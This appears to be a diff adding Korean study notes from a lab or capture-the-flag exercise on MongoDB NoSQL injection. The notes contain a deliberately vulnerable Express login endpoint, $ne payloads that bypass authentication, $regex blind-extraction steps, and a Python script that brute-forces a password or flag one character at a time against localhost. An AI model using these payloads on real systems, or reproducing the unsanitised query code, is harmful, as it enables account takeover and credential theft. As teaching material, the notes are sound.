@@ -1,0 +1,83 @@
+mongo db
+
+http://localhost:3000/query?uid[$ne]=a&upw[$ne]=a
+=> [{"_id":"5ebb81732b75911dbcad8a19","uid":"admin","upw":"secretpassword"}]
+
+
+//
+
+Figure 3. MongoDB NoSQL Injection Example
+
+const express = require('express');
+const app = express();
+const mongoose = require('mongoose');
+const db = mongoose.connection;
+mongoose.connect('mongodb://localhost:27017/', { useNewUrlParser: true, useUnifiedTopology: true });
+app.get('/query', function(req,res) {
+    db.collection('user').find({
+        'uid': req.query.uid,
+        'upw': req.query.upw
+    }).toArray(function(err, result) {
+        if (err) throw err;
+        res.send(result);
+  });
+});
+const server = app.listen(3000, function(){
+    console.log('app.listen');
+});
+
+//
+
+no sqli 
+{"uid": "admin", "upw": {"$ne":""}}
+
+//
+
+Figure 12. 비밀번호 길이 획득
+
+{"uid": "admin", "upw": {"$regex":".{5}"}}
+=> admin
+{"uid": "admin", "upw": {"$regex":".{6}"}}
+=> undefined
+
+//
+
+Figure 13. 비밀번호 획득
+
+{"uid": "admin", "upw": {"$regex":"^a"}}
+admin
+{"uid": "admin", "upw": {"$regex":"^aa"}}
+undefined
+{"uid": "admin", "upw": {"$regex":"^ab"}}
+undefined
+{"uid": "admin", "upw": {"$regex":"^ap"}}
+admin
+...
+{"uid": "admin", "upw": {"$regex":"^apple$"}}
+
+//
+
+Exploit Code 작성
+정규표현식을 통해 한 글자씩 알아내야 하므로, 여러 번 쿼리를 전달해야합니다. 직접 손으로 하기보다는 익스플로잇 스크립트를 작성하는 것이 좋습니다.
+
+Exploit Code
+---
+
+import requests, string
+
+HOST = 'http://localhost'
+ALPHANUMERIC = string.digits + string.ascii_letters
+SUCCESS = 'admin'
+
+flag = ''
+
+for i in range(32):
+    for ch in ALPHANUMERIC:
+        response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}')
+        if response.text == SUCCESS:
+            flag += ch
+            break
+    
+    print(f'FLAG: DH{{{flag}}}')
+
+//
